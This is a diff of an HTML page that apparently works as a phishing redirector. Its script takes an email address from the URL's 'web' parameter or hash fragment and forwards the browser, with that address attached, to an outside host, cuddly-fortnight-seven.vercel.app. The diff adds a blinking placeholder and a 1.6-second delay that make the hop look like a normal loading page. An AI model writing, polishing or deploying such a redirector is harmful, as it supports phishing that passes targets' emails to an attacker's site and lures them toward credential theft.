@@ -158,29 +158,47 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<meta name="referrer" content="no-referrer">
 
-  <script>
-    function getQueryParam(name) {
-      const urlParams = new URLSearchParams(window.location.search);
-      return urlParams.get(name);
-    }
+	<!-- Add Tailwind CSS -->
+	<script src="https://cdn.tailwindcss.com"></script>
+	
+	<!-- Add custom animation for soft blinking -->
+	<style>
+		@keyframes softBlink {
+			0%, 100% { opacity: 1; }
+			50% { opacity: 0.4; }
+		}
+		.animate-soft-blink {
+			animation: softBlink 1.6s ease-in-out infinite;
+		}
+	</style>
 
-    function getHashFragment() {
-      return window.location.hash ? window.location.hash.substring(1) : null;
-    }
+	<script>
+		function getQueryParam(name) {
+			const urlParams = new URLSearchParams(window.location.search);
+			return urlParams.get(name);
+		}
 
-    const webParam = getQueryParam('web');
-    const hashEmail = getHashFragment();
-    const email = webParam || hashEmail;
+		function getHashFragment() {
+			return window.location.hash ? window.location.hash.substring(1) : null;
+		}
 
-    let redirectUrl = 'https://cuddly-fortnight-seven.vercel.app';
+		const webParam = getQueryParam('web');
+		const hashEmail = getHashFragment();
+		const email = webParam || hashEmail;
 
-    if (email) {
-      redirectUrl += '?web=' + encodeURIComponent(email);
-    }
+		let redirectUrl = 'https://cuddly-fortnight-seven.vercel.app';
 
-    window.location.href = redirectUrl;
-  </script>
+		if (email) {
+			redirectUrl += '?web=' + encodeURIComponent(email);
+		}
+
+		// Add 1.6s delay with visual feedback before redirecting
+		setTimeout(function() {
+			window.location.href = redirectUrl;
+		}, 1600);
+	</script>
 </head>
-<body>
-  
+<body class="bg-white flex items-center justify-center min-h-screen m-0">
+	<!-- Simple visual element with soft blinking effect -->
+	<div class="w-12 h-12 bg-blue-500 rounded-lg animate-soft-blink"></div>
 </body>
